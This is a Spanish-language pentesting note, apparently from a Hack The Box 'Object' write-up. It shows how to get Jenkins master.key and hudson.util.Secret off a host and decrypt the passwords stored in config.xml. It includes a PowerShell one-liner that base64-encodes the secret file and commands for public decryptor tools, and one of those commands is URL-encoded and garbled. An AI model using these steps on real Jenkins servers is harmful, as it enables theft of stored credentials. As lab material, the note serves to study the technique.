## DESCRIPTION

JENKINS guarda información muy interesante en los ficheros `config.xml`, de hecho se puede encontrar la contraseña codificada, que se puede desencriptar.

`C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\<<USUARIO>>`

Para que sea posible desencriptarlo, se necesita tambien `master.key` and `hudson.util.Secret`, but from `/secrets/`.
#### Mas información
* https://0xdf.gitlab.io/2022/02/28/htb-object.html#jenkins-enumeration

## EXPLOITATION

1. Tenemos que encontrar el fichero `config.xml`
![[Pasted image 20230314200635.png]]
![[Pasted image 20230314200757.png]]


2. Obtenemos `master.key` and `hudson.util.Secret` from `C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets`
![[Pasted image 20230314201023.png]]
**!!NOTA IMPORTANTE!!** Para pasar el fichero hudson puedes usar base64 y luego descodificarlo

```
powershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte))
```

3. Descargamos el decripter https://github.com/hoto/jenkins-credentials-decryptor

```
./jenkins%2Dcredentials%2Ddecryptor%20%2Dm%20master.key%20%2Ds%20hudson.util.Secret%20%2Dc%20config.xml
```

**!!NOTA IMPORTANTE!!** 
	Para ver como se instala mirar: https://0xdf.gitlab.io/2022/02/28/htb-object.html#jenkins-enumeration

3. Tambien se puede usar el de python: https://github.com/gquere/pwn_jenkins que funciona bien.

```
python jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
```

**!!NOTA IMPORTANTE!!** 
	Para ver como se instala mirar: https://0xdf.gitlab.io/2022/02/28/htb-object.html#jenkins-enumeration

## MACHINES

* Hack The Box: Object

**!!NOTA IMPORTANTE!!** 